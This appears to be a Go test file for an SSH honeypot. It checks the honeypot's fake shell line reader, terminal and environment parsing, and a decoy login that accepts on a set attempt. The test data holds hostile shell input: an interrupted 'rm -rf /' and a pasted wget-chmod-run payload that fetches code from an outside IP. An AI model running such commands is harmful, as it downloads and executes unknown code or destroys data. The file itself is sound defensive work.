package ssh

import (
	"bytes"
	"encoding/binary"
	"errors"
	"io"
	"strings"
	"testing"

	cssh "golang.org/x/crypto/ssh"

	"github.com/rom/xproxy/internal/fakeshell"
)

// shellWithAttempts is a fabrication that accepts on the nth credential.
func shellWithAttempts(t *testing.T, n int) *fakeshell.Shell {
	t.Helper()
	sh, err := fakeshell.New(fakeshell.Options{Attempts: n, Name: "bastion"})
	if err != nil {
		t.Fatal(err)
	}
	return sh
}

// fakeChannel is a channel that reads from a script and collects what was
// written, which is all readLine needs.
type fakeChannel struct {
	in      *bytes.Reader
	out     bytes.Buffer
	failAt  int // write call number that fails, 0 for none
	writes  int
	stderr  bytes.Buffer
	reqName string
	reqBody []byte
}

func (c *fakeChannel) Read(p []byte) (int, error) { return c.in.Read(p) }

func (c *fakeChannel) Write(p []byte) (int, error) {
	c.writes++
	if c.failAt != 0 && c.writes >= c.failAt {
		return 0, errors.New("channel closed")
	}
	return c.out.Write(p)
}

func (c *fakeChannel) Close() error      { return nil }
func (c *fakeChannel) CloseWrite() error { return nil }

func (c *fakeChannel) SendRequest(name string, _ bool, payload []byte) (bool, error) {
	c.reqName, c.reqBody = name, payload
	return true, nil
}

func (c *fakeChannel) Stderr() io.ReadWriter { return &c.stderr }

// lineOf runs readLine over a script and returns the line, whether the reader
// stayed open, and everything the fabrication echoed back.
func lineOf(t *testing.T, script string) (string, bool, string) {
	t.Helper()
	ch := &fakeChannel{in: bytes.NewReader([]byte(script))}
	line, ok := newLineReader(ch).line(func(s string) bool {
		_, err := ch.Write([]byte(s))
		return err == nil
	})
	return line, ok, ch.out.String()
}

// The line reader is what a visitor types at, so what it does with each control
// character is part of the fabrication: a terminal that swallowed a backspace
// would be the one thing in the session that is obviously not a machine.
func TestTheFabricatedLineReader(t *testing.T) {
	for _, tc := range []struct {
		name, script, want, echo string
		open                     bool
	}{
		{name: "a command and a return", script: "id\r", want: "id", open: true, echo: "id\r\n"},
		{name: "a newline ends a line too", script: "id\n", want: "id", open: true, echo: "id\r\n"},
		{
			name: "a backspace erases the character and the echo of it",
			// "idx", then erase the x.
			script: "idx\x7f\r", want: "id", open: true, echo: "idx\b \b\r\n",
		},
		{
			name:   "a backspace on an empty line erases nothing",
			script: "\x7f\x08id\r", want: "id", open: true, echo: "id\r\n",
		},
		{
			name:   "an interrupt abandons the line and keeps the session",
			script: "rm -rf /\x03", want: "", open: true, echo: "rm -rf /^C\r\n",
		},
		{
			name:   "end of input closes the session",
			script: "id\x04", want: "", open: false, echo: "id",
		},
		{
			name: "an escape sequence is neither echoed nor typed",
			// Up-arrow: ESC [ A. The bracket and the A are ordinary
			// characters, and the escape is the one that must not pass.
			script: "\x1b[Aid\r", want: "[Aid", open: true, echo: "[Aid\r\n",
		},
		{name: "a closed channel ends the line", script: "id", want: "", open: false, echo: "id"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			line, open, echo := lineOf(t, tc.script)
			if line != tc.want {
				t.Errorf("read %q, want %q", line, tc.want)
			}
			if open != tc.open {
				t.Errorf("session open %v, want %v", open, tc.open)
			}
			if echo != tc.echo {
				t.Errorf("echoed %q, want %q", echo, tc.echo)
			}
		})
	}
}

// A payload is pasted or piped in one write, so the bytes past the first newline
// are the rest of it -- and every line of it is worth collecting, not just the
// first.
func TestTheFabricatedLineReaderKeepsWhatArrivedAfterALine(t *testing.T) {
	ch := &fakeChannel{in: bytes.NewReader([]byte("wget http://198.51.100.9/x\nchmod +x x\n./x\n"))}
	r := newLineReader(ch)
	write := func(s string) bool {
		_, err := ch.Write([]byte(s))
		return err == nil
	}
	want := []string{"wget http://198.51.100.9/x", "chmod +x x", "./x"}
	for i, w := range want {
		line, ok := r.line(write)
		if !ok {
			t.Fatalf("line %d of a pasted payload was never read", i+1)
		}
		if line != w {
			t.Errorf("line %d read %q, want %q", i+1, line, w)
		}
	}
	// And then the session ends, because the writer has gone.
	if _, ok := r.line(write); ok {
		t.Error("the reader found a fourth line in a three-line payload")
	}
}

// A command is bounded, because it comes off the network and is logged.
func TestTheFabricatedLineReaderBoundsACommand(t *testing.T) {
	long := strings.Repeat("a", maxCommandLine+100)
	line, open, echo := lineOf(t, long+"\r")
	if !open {
		t.Fatal("the reader gave up on a long line")
	}
	if len(line) != maxCommandLine {
		t.Errorf("read %d characters, want %d", len(line), maxCommandLine)
	}
	// What was dropped was never echoed either, so the visitor's terminal and
	// the fabrication's idea of the line stay in step.
	if n := len(echo) - len("\r\n"); n != maxCommandLine {
		t.Errorf("echoed %d characters, want %d", n, maxCommandLine)
	}
}

// A write that fails ends the line rather than looping on a dead channel.
func TestTheFabricatedLineReaderStopsWhenTheChannelGoesAway(t *testing.T) {
	for _, tc := range []struct{ name, script string }{
		{name: "on an ordinary character", script: "id\r"},
		{name: "on the echo of a return", script: "\r"},
		{name: "on a backspace", script: "i\x7f\r"},
		{name: "on an interrupt", script: "\x03"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ch := &fakeChannel{in: bytes.NewReader([]byte(tc.script)), failAt: 1}
			if _, ok := newLineReader(ch).line(func(s string) bool {
				_, err := ch.Write([]byte(s))
				return err == nil
			}); ok {
				t.Error("the reader carried on writing to a channel that had gone")
			}
		})
	}
}

func ptyPayload(term string, cols, rows uint32) []byte {
	b := make([]byte, 0, 4+len(term)+8)
	b = binary.BigEndian.AppendUint32(b, uint32(len(term)))
	b = append(b, term...)
	b = binary.BigEndian.AppendUint32(b, cols)
	b = binary.BigEndian.AppendUint32(b, rows)
	return b
}

// The window size is drawn into a recording, so a number off the network that a
// terminal could not have is replaced rather than carried.
func TestTheFabricationBoundsAWindow(t *testing.T) {
	term, cols, rows := parsePTY(ptyPayload("xterm-256color", 120, 40))
	if term != "xterm-256color" || cols != 120 || rows != 40 {
		t.Errorf("parsePTY gave %q %dx%d", term, cols, rows)
	}
	if _, cols, rows := parsePTY(ptyPayload("xterm", 1_000_000, 0)); cols != 80 || rows != 24 {
		t.Errorf("an impossible window became %dx%d, want the defaults", cols, rows)
	}
	if term, cols, rows := parsePTY([]byte{0, 0, 0, 9}); term != "" || cols != 80 || rows != 24 {
		t.Errorf("a truncated pty-req gave %q %dx%d", term, cols, rows)
	}
	// A payload whose terminal name parses and whose window size is not there:
	// the one that reads past the end of the slice if the length is not checked.
	if term, cols, rows := parsePTY([]byte{0, 0, 0, 1, 'x', 0, 0}); term != "" || cols != 80 || rows != 24 {
		t.Errorf("a pty-req with no window gave %q %dx%d", term, cols, rows)
	}
	// A terminal name off the network is clipped, because it is logged and
	// drawn into a recording's header.
	// Clip64 keeps 64 characters and marks the cut, so a little over 64 is
	// right and 300 is not.
	if term, _, _ := parsePTY(ptyPayload(strings.Repeat("x", 300), 80, 24)); len(term) > 70 {
		t.Errorf("a 300-character terminal name was kept whole: %d characters", len(term))
	}

	if cols, rows, ok := parseWindow(binary.BigEndian.AppendUint32(binary.BigEndian.AppendUint32(nil, 100), 50)); !ok || cols != 100 || rows != 50 {
		t.Errorf("parseWindow gave %dx%d ok=%v", cols, rows, ok)
	}
	if _, _, ok := parseWindow([]byte{0, 0, 0, 1, 0, 0, 0}); ok {
		t.Error("a truncated window-change was read anyway")
	}
	for _, v := range []int{0, -1, 1001} {
		if got := bound(v, 80); got != 80 {
			t.Errorf("bound(%d) = %d, want the default", v, got)
		}
	}
	for _, v := range []int{1, 1000} {
		if got := bound(v, 80); got != v {
			t.Errorf("bound(%d) = %d, want it kept", v, got)
		}
	}
}

// What an env request set is a log field, and both halves of it are clipped.
func TestTheFabricationRecordsAnEnvironmentVariable(t *testing.T) {
	payload := func(name, value string) []byte {
		b := binary.BigEndian.AppendUint32(nil, uint32(len(name)))
		b = append(b, name...)
		b = binary.BigEndian.AppendUint32(b, uint32(len(value)))
		return append(b, value...)
	}
	if got := envPair(payload("LANG", "en_GB.UTF-8")); got != "LANG=en_GB.UTF-8" {
		t.Errorf("envPair gave %q", got)
	}
	if got := envPair(nil); got != "" {
		t.Errorf("a payload with no name gave %q", got)
	}
	if got := envPair(payload("LD_PRELOAD", strings.Repeat("x", 300))); len(got) > 140 {
		t.Errorf("a 300-character value was kept whole: %q", got)
	}
}

// Partial success is the protocol saying the credential was right and another
// factor comes next. Reading it as a refusal would have the fabrication answer a
// credential that was accepted, which is the one thing it must never do.
func TestPartialSuccessIsNotARefusal(t *testing.T) {
	if !partial(&cssh.PartialSuccessError{}) {
		t.Error("partial success was read as a refusal")
	}
	if partial(errors.New("authentication failed")) {
		t.Error("a refusal was read as partial success")
	}
	if partial(nil) {
		t.Error("no error was read as partial success")
	}
}

// The login accepts on the Nth credential and never on which one it was, so a
// visitor cannot learn a password from being let in.
func TestTheFabricatedLoginAcceptsOnTheNthAttempt(t *testing.T) {
	d := &decoy{tries: map[string]int{}, sh: shellWithAttempts(t, 3)}
	id := []byte("session-a")
	for i := 1; i <= 2; i++ {
		if d.takes(id) {
			t.Fatalf("attempt %d was accepted, want the third", i)
		}
	}
	if !d.takes(id) {
		t.Fatal("the third attempt was refused")
	}
	// And the count is gone once it has been used, so a connection that keeps
	// going does not accept on every attempt after the third.
	if n := len(d.tries); n != 0 {
		t.Errorf("the table still holds %d connections", n)
	}
	// A second connection starts its own count.
	other := []byte("session-b")
	if d.takes(other) {
		t.Error("another connection inherited the first one's attempts")
	}
	// forget drops a login that never finished, so the table holds only the
	// logins in progress.
	d.forget(other)
	if n := len(d.tries); n != 0 {
		t.Errorf("forget left %d connections behind", n)
	}

	// One attempt accepts the first credential, without a table entry.
	one := &decoy{tries: map[string]int{}, sh: shellWithAttempts(t, 1)}
	if !one.takes(id) {
		t.Error("a one-attempt login refused the first credential")
	}
	if n := len(one.tries); n != 0 {
		t.Errorf("a one-attempt login kept %d counts", n)
	}

	// A table at its bound accepts rather than refusing anybody: the bound is
	// there to stop the table growing, not to change who gets in.
	full := &decoy{tries: map[string]int{}, sh: shellWithAttempts(t, 3)}
	for i := 0; i < maxDecoyTries; i++ {
		full.tries[string(rune(i))+"x"] = 1
	}
	if !full.takes([]byte("session-c")) {
		t.Error("a full table refused a credential instead of taking it")
	}
}
